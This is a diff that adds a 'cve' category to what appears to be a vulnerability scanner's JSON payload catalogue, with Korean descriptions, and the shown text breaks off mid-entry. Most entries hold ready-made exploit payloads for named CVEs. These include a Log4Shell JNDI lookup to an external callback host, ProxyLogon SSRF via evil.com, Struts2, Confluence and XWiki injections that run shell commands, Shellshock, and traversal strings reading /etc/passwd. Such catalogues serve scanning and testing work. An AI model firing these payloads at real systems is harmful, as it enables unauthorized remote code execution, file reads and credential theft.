@@ -4733,6 +4733,4631 @@
           "reference": "https://portswigger.net/web-security/dom-based/dom-clobbering"
         }
       ]
+    },
+    {
+      "id": "cve",
+      "name": "알려진 취약점 (CVE)",
+      "icon": "🎯",
+      "color": "#e84393",
+      "group": "cve",
+      "payloads": [
+        {
+          "id": "cve_proxylogon",
+          "name": "CVE-2021-26855 ProxyLogon (Exchange SSRF)",
+          "payload": "/autodiscover/autodiscover.json?@evil.com/mapi/emsmdb/?a=~1942062522",
+          "description": "MS Exchange Autodiscover SSRF → 인증 우회 체인(ProxyLogon).",
+          "risk": "critical",
+          "cve": "CVE-2021-26855",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-26855",
+          "applies_to": {
+            "path_contains": [
+              "autodiscover",
+              "/ecp",
+              "/owa",
+              "/mapi",
+              "/rpc"
+            ],
+            "server": [
+              "microsoft-iis",
+              "iis"
+            ]
+          }
+        },
+        {
+          "id": "cve_log4shell",
+          "name": "CVE-2021-44228 Log4Shell (JNDI)",
+          "payload": "${jndi:ldap://log4shell-${sys:java.version}.example.oast/a}",
+          "description": "Log4j JNDI 조회 → OOB. 헤더/파라미터에 삽입해 아웃바운드 콜백 확인.",
+          "risk": "critical",
+          "cve": "CVE-2021-44228",
+          "location": "header",
+          "param": "X-Api-Version",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+          "applies_to": {
+            "always": true,
+            "powered_by": [
+              "java",
+              "jsp",
+              "servlet"
+            ]
+          }
+        },
+        {
+          "id": "cve_struts_5638",
+          "name": "CVE-2017-5638 Struts2 OGNL (Content-Type)",
+          "payload": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['Content-Type']).(#cmd='id').(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true)).(#proc=#p.start())}",
+          "description": "Struts2 Jakarta Content-Type OGNL 주입 → RCE.",
+          "risk": "critical",
+          "cve": "CVE-2017-5638",
+          "location": "header",
+          "param": "Content-Type",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-5638",
+          "applies_to": {
+            "path_contains": [
+              ".action",
+              ".do",
+              "struts"
+            ]
+          }
+        },
+        {
+          "id": "cve_confluence_26134",
+          "name": "CVE-2022-26134 Confluence OGNL",
+          "payload": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29%7D/",
+          "description": "Atlassian Confluence OGNL 주입 → 인증 없는 RCE.",
+          "risk": "critical",
+          "cve": "CVE-2022-26134",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-26134",
+          "applies_to": {
+            "path_contains": [
+              "confluence",
+              "/pages/",
+              "/wiki",
+              "/spaces",
+              "/display"
+            ]
+          }
+        },
+        {
+          "id": "cve_citrix_19781",
+          "name": "CVE-2019-19781 Citrix ADC 경로 traversal",
+          "payload": "/vpn/../vpns/cfg/smb.conf",
+          "description": "Citrix ADC/Gateway 디렉터리 traversal → 템플릿 RCE 체인.",
+          "risk": "critical",
+          "cve": "CVE-2019-19781",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-19781",
+          "applies_to": {
+            "path_contains": [
+              "/vpn",
+              "/vpns",
+              "/citrix",
+              "/cgi/"
+            ]
+          }
+        },
+        {
+          "id": "cve_f5_5902",
+          "name": "CVE-2020-5902 F5 BIG-IP TMUI RCE",
+          "payload": "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user",
+          "description": "F5 BIG-IP TMUI 인증 우회 → tmsh 명령 실행.",
+          "risk": "critical",
+          "cve": "CVE-2020-5902",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-5902",
+          "applies_to": {
+            "path_contains": [
+              "/tmui",
+              "bigip",
+              "/mgmt"
+            ]
+          }
+        },
+        {
+          "id": "cve_apache_41773",
+          "name": "CVE-2021-41773 Apache 경로 traversal/RCE",
+          "payload": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+          "description": "Apache 2.4.49 경로 정규화 우회 → 파일 읽기/CGI 시 RCE.",
+          "risk": "high",
+          "cve": "CVE-2021-41773",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-41773",
+          "applies_to": {
+            "path_contains": [
+              "/cgi-bin",
+              "/icons/"
+            ],
+            "server": [
+              "apache/2.4.49",
+              "apache/2.4.50"
+            ]
+          }
+        },
+        {
+          "id": "cve_shellshock_6271",
+          "name": "CVE-2014-6271 Shellshock (bash)",
+          "payload": "() { :; }; echo; echo; /bin/cat /etc/passwd",
+          "description": "CGI 환경변수 경유 bash 함수 정의 주입 → 명령 실행.",
+          "risk": "critical",
+          "cve": "CVE-2014-6271",
+          "location": "header",
+          "param": "User-Agent",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-6271",
+          "applies_to": {
+            "path_contains": [
+              "/cgi-bin",
+              ".cgi",
+              ".sh",
+              ".pl"
+            ]
+          }
+        },
+        {
+          "id": "cve_phpunit_9841",
+          "name": "CVE-2017-9841 PHPUnit eval-stdin RCE",
+          "payload": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+          "description": "노출된 PHPUnit eval-stdin.php 로 POST 본문 PHP 실행.",
+          "risk": "critical",
+          "cve": "CVE-2017-9841",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
+          "applies_to": {
+            "path_contains": [
+              "/vendor",
+              "/phpunit",
+              "laravel"
+            ],
+            "powered_by": [
+              "php"
+            ]
+          }
+        },
+        {
+          "id": "cve_spring_gw_22947",
+          "name": "CVE-2022-22947 Spring Cloud Gateway SpEL",
+          "payload": "/actuator/gateway/routes",
+          "description": "Spring Cloud Gateway actuator 노출 시 SpEL 주입 → RCE(라우트 추가 후 refresh).",
+          "risk": "critical",
+          "cve": "CVE-2022-22947",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-22947",
+          "applies_to": {
+            "path_contains": [
+              "/actuator",
+              "/gateway"
+            ],
+            "powered_by": [
+              "java",
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "expose_actuator_env",
+          "name": "Spring Boot Actuator 노출 (env/heapdump)",
+          "payload": "/actuator/env",
+          "description": "인증 없는 actuator 노출 → 환경변수/시크릿, /heapdump 로 메모리 덤프.",
+          "risk": "high",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html",
+          "applies_to": {
+            "path_contains": [
+              "/actuator",
+              "/manage",
+              "/env",
+              "/heapdump"
+            ],
+            "powered_by": [
+              "java",
+              "spring"
+            ]
+          }
+        },
+        {
+          "id": "cve_f5_22986",
+          "name": "CVE-2021-22986 F5 iControl REST RCE",
+          "payload": "/mgmt/tm/util/bash",
+          "description": "F5 iControl REST 인증 우회 → bash 유틸로 명령 실행(POST utilCmdArgs).",
+          "risk": "critical",
+          "cve": "CVE-2021-22986",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-22986",
+          "applies_to": {
+            "path_contains": [
+              "/mgmt",
+              "/tm/",
+              "bigip"
+            ]
+          }
+        },
+        {
+          "id": "expose_git_config",
+          "name": "소스 노출 — .git/config",
+          "payload": "/.git/config",
+          "description": "버전관리 디렉터리 노출 → 소스/시크릿 유출.",
+          "risk": "high",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://owasp.org/www-community/attacks/Information_exposure_through_query_strings",
+          "applies_to": {
+            "always": true
+          }
+        },
+        {
+          "id": "expose_env_file",
+          "name": "환경파일 노출 — /.env",
+          "payload": "/.env",
+          "description": ".env 노출 → DB 자격증명/API 키 유출.",
+          "risk": "critical",
+          "cve": "",
+          "location": "path",
+          "param": "",
+          "reference": "https://owasp.org/www-project-web-security-testing-guide/",
+          "applies_to": {
+            "always": true
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_19478",
+          "name": "CVE-2026-19478 GitLab CE/EE - GraphQL @gl_introduced Arbitrary Method Invocation",
+          "payload": "/api/v4/projects?visibility=public&per_page=1",
+          "description": "[Nuclei] GitLab CE/EE - GraphQL @gl_introduced Arbitrary Method Invocation",
+          "risk": "critical",
+          "cve": "CVE-2026-19478",
+          "location": "path",
+          "param": "",
+          "reference": "https://www.cve.org/CVERecord?id=CVE-2026-19478",
+          "applies_to": {
+            "powered_by": [
+              "gitlab"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_21858",
+          "name": "CVE-2026-21858 n8n Webhooks - Remote Code Execution",
+          "payload": "/signin",
+          "description": "[Nuclei] n8n Webhooks - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2026-21858",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-21858",
+          "applies_to": {
+            "path_contains": [
+              "signin"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_24207",
+          "name": "CVE-2026-24207 NVIDIA Triton Inference Server <= 26.02 - Authentication Bypass",
+          "payload": "/models",
+          "description": "[Nuclei] NVIDIA Triton Inference Server <= 26.02 - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-24207",
+          "location": "path",
+          "param": "",
+          "reference": "https://github.com/offseckit/CVE-2026-24207",
+          "applies_to": {
+            "path_contains": [
+              "models"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_27944",
+          "name": "CVE-2026-27944 Nginx UI < 2.3.3 - Information Disclosure",
+          "payload": "/api/backup",
+          "description": "[Nuclei] Nginx UI < 2.3.3 - Information Disclosure",
+          "risk": "critical",
+          "cve": "CVE-2026-27944",
+          "location": "path",
+          "param": "",
+          "reference": "https://github.com/advisories/GHSA-g9w5-qffc-6762",
+          "applies_to": {
+            "path_contains": [
+              "backup"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_33439",
+          "name": "CVE-2026-33439 OpenAM <= 16.0.5 - Pre-Auth RCE via jato.clientSession Deserialization",
+          "payload": "/openam/ui/PWResetUserValidation",
+          "description": "[Nuclei] OpenAM <= 16.0.5 - Pre-Auth RCE via jato.clientSession Deserialization",
+          "risk": "critical",
+          "cve": "CVE-2026-33439",
+          "location": "path",
+          "param": "",
+          "reference": "https://www.hacktron.ai/blog/openam-deserialization-pre-auth-rce",
+          "applies_to": {
+            "path_contains": [
+              "openam"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_39339",
+          "name": "CVE-2026-39339 ChurchCRM - API Authentication Bypass via URL Injection",
+          "payload": "/api/persons/latest?bypass=/api/public",
+          "description": "[Nuclei] ChurchCRM - API Authentication Bypass via URL Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-39339",
+          "location": "path",
+          "param": "",
+          "reference": "https://github.com/ChurchCRM/CRM/security/advisories/GHSA-v3p2-mx78-pxhc",
+          "applies_to": {
+            "path_contains": [
+              "persons"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_41492",
+          "name": "CVE-2026-41492 Dgraph <= 25.3.2 - Admin Token Disclosure",
+          "payload": "/debug/vars",
+          "description": "[Nuclei] Dgraph <= 25.3.2 - Admin Token Disclosure",
+          "risk": "critical",
+          "cve": "CVE-2026-41492",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-41492",
+          "applies_to": {
+            "path_contains": [
+              "debug",
+              "vars"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_42569",
+          "name": "CVE-2026-42569 phpVMS < 7.0.6 - Legacy Importer Authorization Bypass",
+          "payload": "/importer",
+          "description": "[Nuclei] phpVMS < 7.0.6 - Legacy Importer Authorization Bypass",
+          "risk": "critical",
+          "cve": "CVE-2026-42569",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-42569",
+          "applies_to": {
+            "path_contains": [
+              "importer"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_42647",
+          "name": "CVE-2026-42647 JoomSport <= 5.7.7 - SQL Injection",
+          "payload": "/wp-sitemap-posts-joomsport_season-1.xml",
+          "description": "[Nuclei] JoomSport <= 5.7.7 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-42647",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-42647",
+          "applies_to": {
+            "path_contains": [
+              "wp-sitemap-posts-joomsport_season-1.xml"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_44262",
+          "name": "CVE-2026-44262 Scramble Laravel - Remote Code Execution",
+          "payload": "/docs/api.json",
+          "description": "[Nuclei] Scramble Laravel - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2026-44262",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-44262",
+          "applies_to": {
+            "path_contains": [
+              "docs",
+              "api.json"
+            ],
+            "powered_by": [
+              "laravel",
+              "php"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_52806",
+          "name": "CVE-2026-52806 Gogs <= 0.14.2 - Authenticated RCE via git rebase Argument Injection",
+          "payload": "/user/login",
+          "description": "[Nuclei] Gogs <= 0.14.2 - Authenticated RCE via git rebase Argument Injection",
+          "risk": "critical",
+          "cve": "CVE-2026-52806",
+          "location": "path",
+          "param": "",
+          "reference": "https://www.cve.org/CVERecord?id=CVE-2026-52806",
+          "applies_to": {
+            "powered_by": [
+              "gogs"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_53519",
+          "name": "CVE-2026-53519 Nezha Dashboard < 2.0.13 - Path Traversal",
+          "payload": "/dashboard%2e%2e/data/config.yaml",
+          "description": "[Nuclei] Nezha Dashboard < 2.0.13 - Path Traversal",
+          "risk": "critical",
+          "cve": "CVE-2026-53519",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-53519",
+          "applies_to": {
+            "path_contains": [
+              "data"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_59774",
+          "name": "CVE-2026-59774 Gitea 1.22.1-1.27.0 - Unauthenticated Arbitrary File Read",
+          "payload": "/api/v1/repos/search?limit=1",
+          "description": "[Nuclei] Gitea 1.22.1-1.27.0 - Unauthenticated Arbitrary File Read",
+          "risk": "critical",
+          "cve": "CVE-2026-59774",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-59774",
+          "applies_to": {
+            "powered_by": [
+              "gitea"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2026_6875",
+          "name": "CVE-2026-6875 ServiceNow AI Platform - Pre-Auth JavaScript Sandbox Escape RCE",
+          "payload": "/login.do",
+          "description": "[Nuclei] ServiceNow AI Platform - Pre-Auth JavaScript Sandbox Escape RCE",
+          "risk": "critical",
+          "cve": "CVE-2026-6875",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-6875",
+          "applies_to": {
+            "path_contains": [
+              "login.do"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_0108",
+          "name": "CVE-2025-0108 PAN-OS Management Interface - Path Confusion to Authentication Bypass",
+          "payload": "/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css",
+          "description": "[Nuclei] PAN-OS Management Interface - Path Confusion to Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2025-0108",
+          "location": "path",
+          "param": "",
+          "reference": "https://slcyber.io/blog/nginx-apache-path-confusion-to-auth-bypass-in-pan-os/",
+          "applies_to": {
+            "path_contains": [
+              "unauth"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_0282",
+          "name": "CVE-2025-0282 Ivanti Connect Secure - Stack-based Buffer Overflow",
+          "payload": "/dana-na/auth/url_default/welcome.cgi",
+          "description": "[Nuclei] Ivanti Connect Secure - Stack-based Buffer Overflow",
+          "risk": "critical",
+          "cve": "CVE-2025-0282",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-0282",
+          "applies_to": {
+            "path_contains": [
+              "dana-na",
+              "auth"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_11749",
+          "name": "CVE-2025-11749 WordPress AI Engine Plugin - Token Exposure",
+          "payload": "/wp-json/mcp/v1",
+          "description": "[Nuclei] WordPress AI Engine Plugin - Token Exposure",
+          "risk": "critical",
+          "cve": "CVE-2025-11749",
+          "location": "path",
+          "param": "",
+          "reference": "https://www.wordfence.com/blog/2025/11/100000-wordpress-sites-affected-by-privilege-escalation-vulnerability-in-ai-engine-wordpress-plugin/",
+          "applies_to": {
+            "path_contains": [
+              "wp-json",
+              "mcp"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_13315",
+          "name": "CVE-2025-13315 Twonky Server 8.5.2 on Linux and Windows - Log File Exposure",
+          "payload": "/nmc/rpc/log_getfile",
+          "description": "[Nuclei] Twonky Server 8.5.2 on Linux and Windows - Log File Exposure",
+          "risk": "critical",
+          "cve": "CVE-2025-13315",
+          "location": "path",
+          "param": "",
+          "reference": "https://www.rapid7.com/blog/post/cve-2025-13315-cve-2025-13316-critical-twonky-server-authentication-bypass-not-fixed/",
+          "applies_to": {
+            "path_contains": [
+              "nmc",
+              "rpc"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_24893",
+          "name": "CVE-2025-24893 XWiki Platform - Remote Code Execution",
+          "payload": "/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22cat%20/etc/passwd%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d%20",
+          "description": "[Nuclei] XWiki Platform - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2025-24893",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-24893",
+          "applies_to": {
+            "path_contains": [
+              "bin",
+              "get"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_30220",
+          "name": "CVE-2025-30220 GeoServer WFS - XXE Processing Vulnerability",
+          "payload": "/geoserver/wfs?service=WFS&request=GetCapabilities",
+          "description": "[Nuclei] GeoServer WFS - XXE Processing Vulnerability",
+          "risk": "critical",
+          "cve": "CVE-2025-30220",
+          "location": "path",
+          "param": "",
+          "reference": "https://github.com/geoserver/geoserver/security/advisories/GHSA-jj54-8f66-c5pc",
+          "applies_to": {
+            "path_contains": [
+              "geoserver",
+              "wfs"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_32429",
+          "name": "CVE-2025-32429 XWiki Platform - SQL Injection",
+          "payload": "/xwiki/rest/liveData/sources/liveTable/entries?sourceParams.template=getdeleteddocuments.vm&sort=injected",
+          "description": "[Nuclei] XWiki Platform - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2025-32429",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-32429",
+          "applies_to": {
+            "path_contains": [
+              "xwiki",
+              "rest"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_34299",
+          "name": "CVE-2025-34299 Monsta FTP <= 2.11.2 - Unauthenticated Remote Code Execution",
+          "payload": "/mftp/",
+          "description": "[Nuclei] Monsta FTP <= 2.11.2 - Unauthenticated Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2025-34299",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-34299",
+          "applies_to": {
+            "path_contains": [
+              "mftp"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_40551",
+          "name": "CVE-2025-40551 SolarWinds Web Help Desk < 2026.1 - Unauthenticated JNDI Injection RCE",
+          "payload": "/helpdesk/WebObjects/Helpdesk.woa",
+          "description": "[Nuclei] SolarWinds Web Help Desk < 2026.1 - Unauthenticated JNDI Injection RCE",
+          "risk": "critical",
+          "cve": "CVE-2025-40551",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-40551",
+          "applies_to": {
+            "path_contains": [
+              "helpdesk",
+              "webobjects"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_49001",
+          "name": "CVE-2025-49001 DataEase < 2.10.10 - JWT Authentication Bypass",
+          "payload": "/de2api/user/info",
+          "description": "[Nuclei] DataEase < 2.10.10 - JWT Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2025-49001",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-49001",
+          "applies_to": {
+            "path_contains": [
+              "de2api"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2025_49132",
+          "name": "CVE-2025-49132 Pterodactyl Panel - Remote Code Execution",
+          "payload": "/locales/locale.json?locale=..%2F..%2Fconfig&namespace=app",
+          "description": "[Nuclei] Pterodactyl Panel - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2025-49132",
+          "location": "path",
+          "param": "",
+          "reference": "https://github.com/pterodactyl/panel/security/advisories/GHSA-24wv-6c99-f843",
+          "applies_to": {
+            "path_contains": [
+              "locales",
+              "locale.json"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_27954",
+          "name": "CVE-2024-27954 WordPress Automatic Plugin <3.92.1 - Arbitrary File Download and SSRF",
+          "payload": "/?p=3232&wp_automatic=download&link=file:///etc/passwd",
+          "description": "[Nuclei] WordPress Automatic Plugin <3.92.1 - Arbitrary File Download and SSRF",
+          "risk": "critical",
+          "cve": "CVE-2024-27954",
+          "location": "path",
+          "param": "",
+          "reference": "https://wpscan.com/vulnerability/53b97401-1352-477b-a69a-680b01ef7266/",
+          "applies_to": {
+            "path_contains": [
+              "etc"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_55591",
+          "name": "CVE-2024-55591 Fortinet - Authentication Bypass",
+          "payload": "/login?redir=/ng",
+          "description": "[Nuclei] Fortinet - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2024-55591",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/cve-2024-55591",
+          "applies_to": {
+            "powered_by": [
+              "fortinet",
+              "fortios"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2024_9796",
+          "name": "CVE-2024-9796 WordPress WP-Advanced-Search <= 3.3.9 - SQL Injection",
+          "payload": "/wp-content/plugins/wp-advanced-search/class.inc/autocompletion/autocompletion-PHP5.5.php?q=admin&t=wp_users%20--&f=user_login&type=&e",
+          "description": "[Nuclei] WordPress WP-Advanced-Search <= 3.3.9 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2024-9796",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-9796",
+          "applies_to": {
+            "path_contains": [
+              "wp-content",
+              "plugins"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_5991",
+          "name": "CVE-2023-5991 Hotel Booking Lite < 4.8.5 - Arbitrary File Download & Deletion",
+          "payload": "/?filename=../../../../../../etc/passwd&mphb_action=download",
+          "description": "[Nuclei] Hotel Booking Lite < 4.8.5 - Arbitrary File Download & Deletion",
+          "risk": "critical",
+          "cve": "CVE-2023-5991",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-5991",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_6623",
+          "name": "CVE-2023-6623 Essential Blocks < 4.4.3 - Local File Inclusion",
+          "payload": "/index.php?rest_route=%2Fessential-blocks%2Fv1%2Fproducts&is_frontend=true&attributes={\"__file\":\"/etc%2fpasswd\"}",
+          "description": "[Nuclei] Essential Blocks < 4.4.3 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2023-6623",
+          "location": "path",
+          "param": "",
+          "reference": "https://wpscan.com/blog/file-inclusion-vulnerability-fixed-in-essential-blocks-4-4-3/",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2023_6750",
+          "name": "CVE-2023-6750 WordPress WP Clone <= 2.4.2 - Database Backup Exposure",
+          "payload": "/wp-content/uploads/wp-clone/wpclone_backup/database.sql",
+          "description": "[Nuclei] WordPress WP Clone <= 2.4.2 - Database Backup Exposure",
+          "risk": "critical",
+          "cve": "CVE-2023-6750",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-6750",
+          "applies_to": {
+            "path_contains": [
+              "wp-content",
+              "uploads"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_0540",
+          "name": "CVE-2022-0540 Atlassian Jira Seraph - Authentication Bypass",
+          "payload": "/InsightPluginShowGeneralConfiguration.jspa;",
+          "description": "[Nuclei] Atlassian Jira Seraph - Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2022-0540",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-0540",
+          "applies_to": {
+            "powered_by": [
+              "jira"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_0885",
+          "name": "CVE-2022-0885 Member Hero <=1.0.9 - Remote Code Execution",
+          "payload": "/wp-admin/admin-ajax.php?action=memberhero_send_form&_memberhero_hook=phpinfo",
+          "description": "[Nuclei] Member Hero <=1.0.9 - Remote Code Execution",
+          "risk": "critical",
+          "cve": "CVE-2022-0885",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-0885",
+          "applies_to": {
+            "path_contains": [
+              "wp-admin",
+              "admin-ajax.php"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_1390",
+          "name": "CVE-2022-1390 WordPress Admin Word Count Column 2.2 - Local File Inclusion",
+          "payload": "/wp-content/plugins/admin-word-count-column/download-csv.php?path=../../../../../../../../../../../../etc/passwd\\0",
+          "description": "[Nuclei] WordPress Admin Word Count Column 2.2 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2022-1390",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-1390",
+          "applies_to": {
+            "path_contains": [
+              "wp-content",
+              "plugins"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_1391",
+          "name": "CVE-2022-1391 WordPress Cab fare calculator < 1.0.4 - Local File Inclusion",
+          "payload": "/wp-content/plugins/cab-fare-calculator/tblight.php?controller=../../../../../../../../../../../etc/passwd%00&action=1&ajax=1",
+          "description": "[Nuclei] WordPress Cab fare calculator < 1.0.4 - Local File Inclusion",
+          "risk": "critical",
+          "cve": "CVE-2022-1391",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-1391",
+          "applies_to": {
+            "path_contains": [
+              "wp-content",
+              "plugins"
+            ],
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_1692",
+          "name": "CVE-2022-1692 CP Image Store with Slideshow <= 1.0.67 - SQL Injection",
+          "payload": "/?s=codepeople-image-store&post_type=page&feed=rss2",
+          "description": "[Nuclei] CP Image Store with Slideshow <= 1.0.67 - SQL Injection",
+          "risk": "critical",
+          "cve": "CVE-2022-1692",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-1692",
+          "applies_to": {
+            "powered_by": [
+              "wordpress"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_22954",
+          "name": "CVE-2022-22954 VMware Workspace ONE Access - Server-Side Template Injection",
+          "payload": "/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7b%22%66%72%65%65%6d%61%72%6b%65%72%2e%74%65%6d%70%6c%61%74%65%2e%75%74%69%6c%69%74%79%2e%45%78%65%63%75%74%65%22%3f%6e%65%77%28%29%28%22%63%61%74%20%2f%65%74%63%2f%68%6f%73%74%73%22%29%7d",
+          "description": "[Nuclei] VMware Workspace ONE Access - Server-Side Template Injection",
+          "risk": "critical",
+          "cve": "CVE-2022-22954",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-22954",
+          "applies_to": {
+            "path_contains": [
+              "catalog-portal"
+            ],
+            "powered_by": [
+              "vmware"
+            ]
+          }
+        },
+        {
+          "id": "nuclei_cve_2022_23131",
+          "name": "CVE-2022-23131 Zabbix - SAML SSO Authentication Bypass",
+          "payload": "/zabbix/index_sso.php",
+          "description": "[Nuclei] Zabbix - SAML SSO Authentication Bypass",
+          "risk": "critical",
+          "cve": "CVE-2022-23131",
+          "location": "path",
+          "param": "",
+          "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-23131",
+          "applies_to": {
